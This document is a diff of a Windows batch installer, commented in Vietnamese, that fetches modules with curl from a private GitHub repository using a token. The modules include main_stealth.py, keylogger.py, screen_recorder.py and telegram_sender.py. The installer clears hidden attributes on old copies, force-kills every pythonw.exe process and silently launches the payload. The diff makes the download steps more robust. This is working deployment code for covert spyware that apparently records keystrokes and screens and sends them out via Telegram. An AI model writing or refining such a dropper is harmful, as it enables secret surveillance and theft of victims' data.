@@ -96,15 +96,22 @@ if exist "config.py" (
 
 REM Tải từng file một cách rõ ràng
 echo Dang tai main_stealth.py...
-curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "main_stealth.py" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/main_stealth.py" 2>&1 | findstr /V "Total Received Xferd" >nul
+curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "main_stealth.py.tmp" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/main_stealth.py" 2>nul
 if errorlevel 1 (
     echo [ERROR] Khong the tai main_stealth.py!
     echo Kiem tra lai GITHUB_TOKEN hoac ket noi internet.
     pause
     exit /b 1
 )
-if not exist "main_stealth.py" (
+if not exist "main_stealth.py.tmp" (
     echo [ERROR] File main_stealth.py khong ton tai sau khi tai!
+    pause
+    exit /b 1
+)
+REM Đổi tên file tạm thành file chính
+move /y "main_stealth.py.tmp" "main_stealth.py" >nul 2>&1
+if not exist "main_stealth.py" (
+    echo [ERROR] Khong the tao file main_stealth.py!
     pause
     exit /b 1
 )
@@ -115,7 +122,10 @@ if exist "config.py" (
     attrib -h -s "config.py" >nul 2>&1
     del /f /q "config.py" >nul 2>&1
 )
-curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "config.py" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/config.py" 2>&1 | findstr /V "Total Received Xferd" >nul
+curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "config.py.tmp" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/config.py" 2>nul
+if exist "config.py.tmp" (
+    move /y "config.py.tmp" "config.py" >nul 2>&1
+)
 if not exist "config.py" (
     echo [ERROR] Khong the tai config.py!
     pause
@@ -127,7 +137,10 @@ echo Dang tai requirements.txt...
 if exist "requirements.txt" (
     del /f /q "requirements.txt" >nul 2>&1
 )
-curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "requirements.txt" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/requirements.txt" 2>&1 | findstr /V "Total Received Xferd" >nul
+curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "requirements.txt.tmp" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/requirements.txt" 2>nul
+if exist "requirements.txt.tmp" (
+    move /y "requirements.txt.tmp" "requirements.txt" >nul 2>&1
+)
 echo [OK] Da tai requirements.txt
 
 echo Dang tai cac file module...
@@ -136,7 +149,10 @@ for %%f in (screen_recorder.py keylogger.py telegram_sender.py file_manager.py s
         attrib -h -s "%%f" >nul 2>&1
         del /f /q "%%f" >nul 2>&1
     )
-    curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "%%f" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/%%f" >nul 2>&1
+    curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "%%f.tmp" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/%%f" >nul 2>&1
+    if exist "%%f.tmp" (
+        move /y "%%f.tmp" "%%f" >nul 2>&1
+    )
 )
 
 echo [OK] Da tai tat ca file
@@ -202,20 +218,13 @@ echo.
 
 REM Khởi động ứng dụng
 echo Dang khoi dong ung dung...
-REM Dừng process cũ nếu có (chỉ dừng process từ thư mục cài đặt)
-for /f "tokens=2" %%a in ('tasklist /FI "IMAGENAME eq pythonw.exe" /FO LIST ^| findstr "PID"') do (
-    wmic process where "ProcessId=%%a" get CommandLine 2>nul | findstr /C:"%INSTALL_DIR%" >nul
-    if not errorlevel 1 (
-        taskkill /F /PID %%a >nul 2>&1
-    )
+REM Dừng process cũ nếu có (đơn giản hóa - chỉ dừng nếu có)
+tasklist /FI "IMAGENAME eq pythonw.exe" 2>nul | find /I "pythonw.exe" >nul
+if not errorlevel 1 (
+    echo [INFO] Tim thay process pythonw.exe cu, dang dong...
+    taskkill /F /IM pythonw.exe >nul 2>&1
+    timeout /t 1 >nul 2>&1
 )
-for /f "tokens=2" %%a in ('tasklist /FI "IMAGENAME eq python.exe" /FO LIST ^| findstr "PID"') do (
-    wmic process where "ProcessId=%%a" get CommandLine 2>nul | findstr /C:"%INSTALL_DIR%" >nul
-    if not errorlevel 1 (
-        taskkill /F /PID %%a >nul 2>&1
-    )
-)
-timeout /t 2 >nul 2>&1
 
 REM Khởi động mới
 echo Dang khoi dong pythonw...
